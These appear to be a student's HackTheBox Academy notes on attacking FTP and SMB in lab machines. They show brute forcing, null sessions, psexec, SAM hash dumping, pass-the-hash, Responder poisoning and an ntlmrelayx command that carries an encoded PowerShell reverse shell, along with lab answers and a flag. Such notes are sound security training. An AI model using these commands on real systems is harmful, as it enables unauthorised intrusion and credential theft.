---
description: 11/11 HackTheBox notes started.
---

# Attacking Common Services

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Attacking FTP

FTP is used to transfer files between computers, whilst also performing directory and file operations like changing the current working directory. By default FTP listens on port TCP/21.

#### Enumerating FTP

```shell-session
0xgrooted@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

#### Misconfigurations

We can login anonymously using the username anonymous with no password. This can be done as follows:

```shell-session
0xgrooted@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

#### Brute forcing with medusa

```shell-session
0xgrooted@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

#### FTP Bounce Attack

A network attack that uses FTP servers to deliver outbound traffic to another traffic currently on the network.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This can be done through nmap:

```shell-session
0xgrooted@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

What port is the FTP service running on?

Method:&#x20;

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ nmap -sC -sV 10.129.40.233
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 12:30 CST
Nmap scan report for 10.129.40.233
Host is up (0.045s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
|_-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.40.233]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=11/11%Time=691380C7%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.1
SF:29\.40\.233\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
SF:ive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-11T18:30:34
|_  start_date: N/A
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.39 seconds

```

Answer: 2121

Question:  What username is available for the FTP server?

Method:

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ ftp anonymous@10.129.40.233 -p 2121
Connected to 10.129.40.233.
220 ProFTPD Server (InlaneFTP) [10.129.40.233]
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21289|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> get *
local: htb_vpn_logs.log remote: *
229 Entering Extended Passive Mode (|||12563|)
550 *: No such file or directory
ftp> get users.list
local: users.list remote: users.list
229 Entering Extended Passive Mode (|||15028|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72      963.18 KiB/s 
226 Transfer complete
72 bytes received in 00:00 (1.57 KiB/s)
ftp> get passwords.list
local: passwords.list remote: passwords.list
229 Entering Extended Passive Mode (|||44109|)
150 Opening BINARY mode data connection for passwords.list (1959 bytes)
  1959        3.45 MiB/s 
226 Transfer complete
1959 bytes received in 00:00 (44.70 KiB/s)
ftp> 

```

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ cat users.list
root
robin
adm
admin
administrator
MARRY
jason
sa
dbuser
pentest
marlin

```

This question and the last both go together

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ medusa -U users.list -P passwords.list -h 10.129.40.233 -M ftp -n 2121
```

Or with hydra:

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ hydra -l "robin" -P passwords.list ftp://10.129.40.233:2121 
```

Which gives us the password: 7iz4rnckjsduza7

Now we login:

```
─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ ftp robin@10.129.40.233 -p 2121
Connected to 10.129.40.233.
220 ProFTPD Server (InlaneFTP) [10.129.40.233]
331 Password required for robin
Password: 
230 User robin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15094|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 robin    robin          27 Apr 18  2022 flag.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||18764|)
150 Opening BINARY mode data connection for flag.txt (27 bytes)
    27        8.65 KiB/s 
226 Transfer complete
27 bytes received in 00:00 (0.58 KiB/s)
ftp> 


```

which gives us the answer:

HTB{ATT4CK1NG\_F7P\_53RV1C3}

***

### Attacking SMB

A communication protocol created for providing shared access to files and printers across nodes on a network, Running on TCP/IP 445 since windows 2000, Previously it ran over port 139.

#### Enumeration

```shell-session
0xgrooted@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

#### Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

**File Share**

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

&#x20; Attacking SMB

```shell-session
0xgrooted@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

```shell-session
0xgrooted@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

**Enum4Linux**

```shell-session
0xgrooted@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

**Password brute forcing**

```shell-session
0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 

```

**Impacket**

Used to connect to a remote machine

```shell-session
0xgrooted@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

**Enumerate logged in users**

```shell-session
0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

**Extract hashes from SAM Database**

```shell-session
0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

**PassTheHash login**

```shell-session
0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

**Capturing Credentials using responder**

```shell-session
0xgrooted@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Using Impacket we can then send and execute a reverse shell:

```shell-session
0xgrooted@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```shell-session
0xgrooted@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
```

Question: What is the name of the shared folder with READ permissions?

Method:&#x20;

I started with a nmap scan to see what port smb was running on

```
└──╼ [★]$ nmap 10.129.232.68 -sC -sV -p139,445
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-12 06:52 CST
Nmap scan report for 10.129.232.68
Host is up (0.63s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-11-12T12:52:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds

```

Using smbmap we get our answer:&#x20;

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$ smbmap -H 10.129.232.68
[+] IP: 10.129.232.68:445	Name: 10.129.232.68                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

```

Answer: GGJ

Question: What is the password for the username "jason"?

First download the password resources list and unzip from hackthebox.

```
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/pws.zip
--2025-11-12 06:56:44--  https://academy.hackthebox.com/storage/resources/pws.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.69, 109.176.239.70
Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1584 (1.5K) [application/zip]
Saving to: ‘pws.zip’

pws.zip                                         100%[=====================================================================================================>]   1.55K  --.-KB/s    in 0s      

2025-11-12 06:56:44 (25.1 MB/s) - ‘pws.zip’ saved [1584/1584]

```

And then start brute forcing with the list:

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
└──╼ [★]$  crackmapexec smb 10.129.232.68 -u 'jason' -p pws.list --local-auth
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.232.68   445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:dolphins STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maddog STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:packers STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jaguar STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:lovers STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nicholas STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:united STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:tiffany STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maxwell STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:zzzzzz STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nirvana STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jeremy STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:suckit STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:stupid STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:porn STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:monica STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:elephant STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:giants STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jackass STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:hotdog STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:rosebud STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:success STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:debbie STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:mountain STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:444444 STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:xxxxxxxx0 STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
